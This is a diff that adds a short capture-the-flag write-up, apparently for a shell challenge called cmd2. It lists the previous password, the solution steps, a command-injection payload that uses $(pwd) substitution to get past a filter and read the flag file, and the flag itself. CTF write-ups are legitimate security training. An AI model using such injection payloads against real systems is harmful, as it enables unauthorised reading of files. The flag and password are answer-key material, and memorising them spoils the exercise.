@@ -1,0 +1,10 @@
+PASSWORD:mommy now I get what PATH environment is for :)
+
+Solution:
+1. use cd .. ; cd .. to return to /
+2. now pwd is '/'
+3. use command substitution to type /bin/cat /home/cmd2/f*
+
+./cmd2 "cd .. ; cd .. ; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*"
+
+flag: FuN_w1th_5h3ll_v4riabl3s_haha
